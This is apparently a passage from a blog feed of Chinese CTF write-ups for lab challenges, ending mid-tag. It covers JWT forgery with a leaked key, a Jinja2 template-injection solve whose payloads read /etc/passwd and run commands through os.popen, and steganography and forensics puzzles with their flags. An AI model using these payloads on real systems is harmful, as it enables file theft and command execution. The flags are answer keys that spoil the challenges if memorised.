        <content type="html"><![CDATA[<h2 id="1-芜湖，身份伪造，-脑洞"><a href="#1-芜湖，身份伪造，-脑洞" class="headerlink" title="1.芜湖，身份伪造，+脑洞"></a>1.芜湖，身份伪造，+脑洞</h2><p>1.需要注册登录，直接先注册一个账号，然后使用注册的账号进行登录，可以上传文件，上传php文件，但是解析不了。<br>2.扫目录，呜呜，有<code>robots.txt</code>文件，内容如下<code>Disallow: /static/secretkey.txt</code>。<br>3.访问提示<code>Disallow: /static/secretkey.txt</code>得<code>you-will-never-guess</code>。<br>4.抓包，看到<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMTExMSJ9.11KovmFggafMdmrs-Nre6A7kCc0SZZTw-srfpFBTMd4</code>，神似JWT，就是JWT，<a href="jwt.io">jwt.io</a><br>5.开始我的身份为我注册的账户名<code>1111</code>，改为<code>admin</code>，以<code>you-will-never-guess</code>为密钥，得<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.g_lGU4qTO2VhNrZK9k460xz828GcqKBayZPcmLmhUqE</code><br>6.伪造身份登陆后，发现<code>flag.png</code>，直接访问不行得不到数据，保存到桌面用记事本打开即可<code>flag&#123;573cec8d-716f-48d4-9f48-57fc470e8fa6&#125;</code><br><img src="/2020/12/07/RootersCTF2019-ImgXweb//1.png" alt="这这这"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019华东南赛区-Double_Secret</title>
      <link href="/2020/12/07/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/"/>
      <url>/2020/12/07/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/</url>
      
        <content type="html"><![CDATA[<h2 id="0-用到的链接"><a href="#0-用到的链接" class="headerlink" title="0.用到的链接"></a>0.用到的链接</h2><p><a href="https://blog.csdn.net/csdn_pade/article/details/88566032">Flask&#x2F;Jinja2模板注入中的一些绕过姿势</a></p><h2 id="1-判断"><a href="#1-判断" class="headerlink" title="1.判断"></a>1.判断</h2><p>1.首先访问<a href="http://bbe7494e-16e0-459c-a71c-83f246a9a3f1.node3.buuoj.cn/">主页面</a>看到信息<code>Welcome To Find Secret</code>。<br>2.然后进入页面<code>http://bbe7494e-16e0-459c-a71c-83f246a9a3f1.node3.buuoj.cn/secret</code>得到信息<code>Tell me your secret.I will encrypt it so others can&#39;t see</code>。加密信息？<br>3.输入杂乱的信息<code>http://bbe7494e-16e0-459c-a71c-83f246a9a3f1.node3.buuoj.cn/secret?secret=dawfaef</code>出现flask报错。<br>4.flask报错内容如下:(并且报错可以看到python版本为2.7)<br><code>File &quot;/app/app.py&quot;, line 35, in secret</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line">Open an interactive python shell <span class="keyword">in</span> this frame    <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><p>经过rc4解密(有密钥)后进行模版渲染，考虑模版注入漏洞</p><h2 id="2-模版注入"><a href="#2-模版注入" class="headerlink" title="2.模版注入"></a>2.模版注入</h2><p><code>用得RC4加密的脚本</code>昨天做一道misc题目的时候恰巧用到了这个rc4加密，当时是在线上的网站上面解的密。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的字符串是：%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="comment">#print(&quot;加密后的输出(经过编码):&quot;)</span></span><br><span class="line">    <span class="comment">#print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2020/12/07/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret//1.png">这里用的注入payload是<code>&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()&#125;&#125;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">读文件：  &#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()</span><br><span class="line">执行命令：&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#x27;ls&#x27;).read()</span><br></pre></td></tr></table></figure><p><code>.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</code><br>然后直接GET传参吧<code>/secret?secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</code></p><h2 id="3-flag"><a href="#3-flag" class="headerlink" title="3.flag"></a>3.flag</h2><p><code>&#39;class&#39; is not allowed. Secret is flag&#123;f20771b3-5571-48ca-b2c5-f467c2c21857&#125;</code><br><code>flag&#123;f20771b3-5571-48ca-b2c5-f467c2c21857&#125;</code></p><p>注:只有这个payload可以用<code>&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()</code>，太菜了。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Jinja2模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-misc</title>
      <link href="/2020/12/07/buuctf-misc/"/>
      <url>/2020/12/07/buuctf-misc/</url>
      
        <content type="html"><![CDATA[<p><strong>并非从第一题开始的</strong></p><h2 id="001-刷新过的图片"><a href="#001-刷新过的图片" class="headerlink" title="001.刷新过的图片"></a>001.刷新过的图片</h2><p><strong>F5隐写，使用工具F5-Steganography或者进行解密</strong><br>先打开kali命令行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitee.com/erkymh/F5-steganography</span><br><span class="line">#粘贴文件到该目录下</span><br><span class="line">java Extract Misc.jpg</span><br><span class="line">#分离处的output.txt挪到windows下面改后缀为.zip</span><br><span class="line">伪加密`14 00 01 00`这个地方把01改为00即可。</span><br></pre></td></tr></table></figure><p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p><h2 id="002-snake"><a href="#002-snake" class="headerlink" title="002.snake"></a>002.snake</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#binwalk分离一下，分出三个文件，分别看一下。一个key，一个cipher。key的内容是个base64，解一下码。</span><br><span class="line">What is Nicki Minaj&#x27;s favorite song that refers to snakes?翻译一下为</span><br><span class="line">妮琪·米娜最喜欢的一首提到蛇的歌是什么？</span><br><span class="line">查到了这个`Anaconda`</span><br></pre></td></tr></table></figure><p>然后怎么解密呢？沃日，SERPENT加密，SERPENT也是蛇的意思，这脑洞我真的服。。。<br><a href="http://serpent.online-domain-tools.com/">http://serpent.online-domain-tools.com/</a>在线解密，选择文件，输入密钥<code>Anaconda</code>解密即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;who_knew_serpent_cipher_existed&#125;</span><br><span class="line">flag&#123;who_knew_serpent_cipher_existed&#125;</span><br></pre></td></tr></table></figure><h2 id="003-BJDCTF-2nd-圣火昭昭-y1ng"><a href="#003-BJDCTF-2nd-圣火昭昭-y1ng" class="headerlink" title="003.[BJDCTF 2nd]圣火昭昭-y1ng"></a>003.[BJDCTF 2nd]圣火昭昭-y1ng</h2><p><code>解题步骤</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">图片用记事本打开之后也没有什么特别之处，那就试一下用stegsolve打开，也没发现啥。</span><br><span class="line">查看图片属性发现提示`新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如`解密后为`gemlovecom`。</span><br><span class="line">新佛曰解密网站`http://hi.pcmoe.net/buddha.html`。</span><br><span class="line">然后因为题目的`猜`字加重了，所以可能是`outguess`加密，啊这，不愧是脑洞。</span><br><span class="line"></span><br><span class="line">##使用下面的命令解密</span><br><span class="line">outguess -k &quot;gemlove&quot; -r sheng_huo_zhao_zhao.jpg flag.txt</span><br><span class="line"></span><br><span class="line">BJD&#123;wdnmd_misc_1s_so_Fuck1ng_e@sy&#125;</span><br><span class="line">flag&#123;wdnmd_misc_1s_so_Fuck1ng_e@sy&#125;</span><br></pre></td></tr></table></figure><p><code>outguess工具使用方法</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">####先下载</span><br><span class="line">git clone https://gitee.com/bxqtee/outguess</span><br><span class="line">####再安装</span><br><span class="line">./configure &amp;&amp; make &amp;&amp; make install </span><br><span class="line"></span><br><span class="line">加密：</span><br><span class="line">outguess -k &quot;my secret key&quot; -d hidden.txt demo.jpg out.jpg</span><br><span class="line">加密之后，demo.jpg会覆盖out.jpg, </span><br><span class="line">hidden.txt中的内容是要隐藏的东西</span><br><span class="line">解密：</span><br><span class="line">outguess -k &quot;my secret key&quot; -r out.jpg hidden.txt</span><br><span class="line">解密之后，解密内容放在hidden.txt中</span><br></pre></td></tr></table></figure><h2 id="004-梅花香之苦寒来"><a href="#004-梅花香之苦寒来" class="headerlink" title="004.梅花香之苦寒来"></a>004.梅花香之苦寒来</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">##查看属性提示·会画图吗？·  还有  ·图穷flag见·，不知道怎么搞</span><br><span class="line">记事本打开之后在文件的末尾发现大量的hex数据，可以直接用网站转为字符串。</span><br></pre></td></tr></table></figure><p><a href="https://zixuephp.net/tool-str-hex.html">在线的网站HEX转为字符串</a><br>是大量的坐标，画图。<br>先去掉括号，本来想用脚本，但是既然vc可以直接替换成空格，那就省事了也。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pylab <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">x, y = np.loadtxt(<span class="string">&#x27;./坐标.txt&#x27;</span>, delimiter=<span class="string">&#x27;,&#x27;</span>, unpack=<span class="literal">True</span>)</span><br><span class="line">plt.plot(x, y, <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>获得二维码，扫过二维码之后获得flag<br><code>flag&#123;40fc0a979f759c8892f4dc045e28b820&#125;</code></p><h2 id="005-菜刀666"><a href="#005-菜刀666" class="headerlink" title="005.菜刀666"></a>005.菜刀666</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">##打开是个流量分析，用wireshark打开</span><br><span class="line">既然是菜刀666，那就找到上传的文件的地方，有upload/1.php的那里然后选择追踪到第7个TCP流&lt;tcp.stream eq 7&gt;。然后发现下面的两个参数z1和z2，z1很短，值如下</span><br><span class="line">RDpcd2FtcDY0XHd3d1x1cGxvYWRcNjY2Ni5qcGc%3D，然后解BASE64后的值如下`D:\wamp64\www\upload\6666.jpg`，估计后面的z2的值就是这张图片的内容了吧(开头为FF D8典型的jpg文件格式)。</span><br><span class="line">直接复制粘贴到winhex里面去保存为1.jpg即可。内容识别一下是`Th1s_1s_p4sswd_!!!`，继续向后追踪tcp流。</span><br></pre></td></tr></table></figure><p><img src="/2020/12/07/buuctf-misc//1.jpg"><br><img src="/2020/12/07/buuctf-misc//2.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">追踪到流9的时候发现了仔细观察最下面的东西发现应该是一个加密的压缩包的内容，内容如下。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|PK...........KQ...4...(.......flag.txtC......cS...J..Ea.v....&amp;e$K..2%..$..,..=.J..1p..p46.PK..?..........KQ...4...(.....$....... .......flag.txt</span><br><span class="line">. .........J. ..p...o2.p...o2.p..PK..........Z...Z.....well,you need passwd!.|&lt;-</span><br></pre></td></tr></table></figure><p>额，直接把整个流量包拉到kali里面，binwalk -e 666666.pcapng分离出压缩包之后拉到windows里面解压(zip后缀名的是我们需要的压缩包)，直接复制到win解压，密码为刚才图片上的密码。<br><code>flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</code></p><h2 id="006-认真你就输了"><a href="#006-认真你就输了" class="headerlink" title="006.认真你就输了"></a>006.认真你就输了</h2><p>提示<code>The flag is under this nicely made chart. </code>???啥意思<br>记事本打开，艾，不行，直接改后缀名为.zip打开之后.&#x2F;xl&#x2F;charts&#x2F;目录下发现flag.txt文件。改后缀名是突然想到的，有次做一道java web + xxe的题目时用到的，太菜了。。。<br>flag.txt文件拉出来打开为<code>flag&#123;M9eVfi2Pcs#&#125;</code>，<del>估计还有啥加密，这肯定还不行。。。</del>沃日可以操就是flag。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;M9eVfi2Pcs#&#125;</span><br></pre></td></tr></table></figure><h2 id="007-GXYCTF2019-佛系青年"><a href="#007-GXYCTF2019-佛系青年" class="headerlink" title="007.[GXYCTF2019]佛系青年"></a>007.[GXYCTF2019]佛系青年</h2><p>压缩包只能解压出来一个png图片，另一个文件需要密码，图片解压出来之后先r查看图片信息。什么都无，binwalk也没发现啥东西，stegsolve打开看看，啥都没发现，<del>沃日</del>伪加密。。。<br>09改00，<del>沃日</del>真佛洗。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">佛曰：遮等諳勝能礙皤藐哆娑梵迦侄羅哆迦梵者梵楞蘇涅侄室實真缽朋能。奢怛俱道怯都諳怖梵尼怯一罰心缽謹缽薩苦奢夢怯帝梵遠朋陀諳陀穆諳所呐知涅侄以薩怯想夷奢醯數羅怯諸</span><br></pre></td></tr></table></figure><p>解一下密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;w0_fo_ci_Be1&#125;</span><br></pre></td></tr></table></figure><p><del>日</del></p><h2 id="008-穿越时空的思念"><a href="#008-穿越时空的思念" class="headerlink" title="008.穿越时空的思念"></a>008.穿越时空的思念</h2><p>题目描述:嫦娥当年奔月后，非常后悔，因为月宫太冷清，她想：早知道让后羿自己上来了，带了只兔子真是不理智。于是她就写了一首曲子，诉说的是怀念后羿在的日子。无数年后，小明听到了这首曲子，毅然决定冒充后羿。然而小明从曲子中听不出啥来，咋办。。（该题目为小写的32位字符，提交即可） 注意：得到的 flag 请包上 flag{} 提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.下载下来的是一个音频文件，打开听一下有摩斯，用au打开双通道，分析下面的莫斯电码</span><br><span class="line">2.分了两段</span><br><span class="line">&lt;1&gt;: ..-./-----/..---/----./-.../-../-..../..-./...../...../.----/.----/...--/----./././-.././-.../---.././....-/...../.-/.----/--.../...../-.../-----/--.../---../-..../</span><br><span class="line">&lt;2&gt;: ..-./-----/..---/----./-.../-../-..../..-./.....</span><br><span class="line">3.前一段:F029BD6F551139EEDEB8E45A175B0786   后一段:F029BD6F5，注意到后一段的值与前一段的前9个是相同的，所以猜测这后面的这段数据是冗余的。</span><br><span class="line"></span><br><span class="line">4.发现前一段正好是32为，md5解一下qerjlkjhbv</span><br><span class="line">5.提到兔子想到rabbit解密一下看看。~日，直接就是上面的md5小写我丢，这就是misc？~</span><br><span class="line">6.&gt;&gt;&gt; print(str.lower(&quot;F029BD6F551139EEDEB8E45A175B0786 &quot;))</span><br><span class="line">f029bd6f551139eedeb8e45a175b0786</span><br><span class="line">flag&#123;f029bd6f551139eedeb8e45a175b0786&#125;</span><br></pre></td></tr></table></figure><h2 id="009-BJDCTF2020-鸡你太美"><a href="#009-BJDCTF2020-鸡你太美" class="headerlink" title="009.[BJDCTF2020]鸡你太美"></a>009.[BJDCTF2020]鸡你太美</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">啊这。。。</span><br><span class="line">1.首先是两个文件，有个gif先用steg打开frame分析一下，没思路，看第二个gif，打不开，记事本打开发现9a，而gif文件头为GIF89a?，给她改回来再打开。少了前四位`47 49 46 38`加上即可。</span><br><span class="line">2.竖排的一个只因你太咩，复制一下。zhi-yin-you-are-beautiful</span><br><span class="line">3.flag&#123;zhi-yin-you-are-beautiful&#125;，~日，下划线不是横杠~</span><br><span class="line">4.flag&#123;zhi_yin_you_are_beautiful&#125;</span><br></pre></td></tr></table></figure><h2 id="010-BJDCTF-2nd-Real-EasyBaBa"><a href="#010-BJDCTF-2nd-Real-EasyBaBa" class="headerlink" title="010.[BJDCTF 2nd]Real_EasyBaBa"></a>010.[BJDCTF 2nd]Real_EasyBaBa</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.图片用记事本打开最后发现隐藏有其他的文件，用binwalk分离一下。</span><br><span class="line">2.dd if=ezbb_r.png of=1.zip bs=1 skip=28673   ##还是用dd命令分离一下吧</span><br><span class="line">3.粘贴到windows里面，日，还是不行，原来是没有文件头，那就打开winhex修改一下吧。</span><br><span class="line">4.加上文件头50 4B再binwalk。得到hint是个二维码，txt记事本打开缩小很多之后，用手机qq就能扫出来了，啥都不缺。</span><br><span class="line">5.扫出命令:od -vtx1 ./ezbb_r.png | head -56 | tail -28</span><br><span class="line">6.再kaili里面执行命令:od -vtx1 ./ezbb_r.png | head -56 | tail -28得</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">0000700 01 00 02 10 03 10 00 00 01 ee c0 b8 a6 00 00 00</span><br><span class="line">0000720 ff ff ff 00 ff ff ff ff 00 ff ff 00 00 00 ff ff</span><br><span class="line">0000740 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 00</span><br><span class="line">0000760 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 00</span><br><span class="line">0001000 ff ff 00 00 00 00 ff 00 00 ff 00 ff 00 ff 00 00</span><br><span class="line">0001020 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 00</span><br><span class="line">0001040 ff 00 ff 00 ff 00 ff 00 00 ff 00 ff 00 00 ff 00</span><br><span class="line">0001060 ff ff ff 00 ff ff ff 00 00 ff ff 00 00 00 ff ff</span><br><span class="line">0001100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001120 ff ff ff 00 ff ff ff 00 ff ff ff 00 ff ff 00 00</span><br><span class="line">0001140 ff 00 00 00 00 00 ff 00 00 00 ff 00 00 ff 00 00</span><br><span class="line">0001160 ff ff ff 00 00 00 ff 00 ff ff ff 00 00 ff 00 00</span><br><span class="line">0001200 00 00 ff 00 00 00 ff 00 ff 00 00 00 00 ff 00 00</span><br><span class="line">0001220 ff ff ff 00 00 00 ff 00 ff ff ff 00 ff ff ff 00</span><br><span class="line">0001240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001260 ff ff ff 00 ff 00 ff 00 ff ff ff 00 ff ff ff 00</span><br><span class="line">0001300 ff 00 00 00 ff 00 ff 00 ff 00 ff 00 00 00 ff 00</span><br><span class="line">0001320 ff ff ff 00 ff ff ff 00 ff ff ff 00 00 00 ff 00</span><br><span class="line">0001340 00 00 ff 00 00 00 ff 00 00 00 ff 00 00 00 ff 00</span><br><span class="line">0001360 ff ff ff 00 00 00 ff 00 ff ff ff 00 00 00 ff 00</span><br><span class="line">0001400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001420 ff ff ff 00 ff ff 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001440 ff 00 00 00 00 ff 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001460 ff ff ff 00 00 ff 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001500 ff 00 ff 00 00 ff ff 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001520 ff 00 ff 00 00 ff 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001540 ff ff ff 00 00 ff 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001560 00 00 00 00 ff ff 00 63 da e9 3c 36 b1 aa 93 59</span><br></pre></td></tr></table></figure><p><code>f高亮显示一下即得flag（notepad++支持这种操作，选中自动变绿。）</code><br><code>BID&#123;572154976&#125;</code><br><code>flag&#123;572154976&#125;</code></p><h2 id="011-GKCTF2020-Pokémon"><a href="#011-GKCTF2020-Pokémon" class="headerlink" title="011.[GKCTF2020]Pokémon"></a>011.[GKCTF2020]Pokémon</h2><p><code>Hint:Pokémon 说明是windows编码的，只是游戏简单操作说明 flag格式为flag&#123;flag_is_here&#125;,,,比赛累了吧,怀旧一把，我在103号道路等你</code></p><p>先下个游戏的运行环境，就是gba的类似启动器的一种东西。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.游戏放在桌面上用VisualBoyAdvance打开，开始玩，口袋怪兽绿宝石没玩过。。。</span><br><span class="line">2.根据在网上搜到的攻略玩，做完第一个任务一直向上走就能找到藏flag的地方了。</span><br><span class="line">3.flag&#123;PokEmon_14_CutE&#125;</span><br></pre></td></tr></table></figure><p><del>MISC真是啥都有</del></p><h2 id="012-ACTF新生赛2020-outguess"><a href="#012-ACTF新生赛2020-outguess" 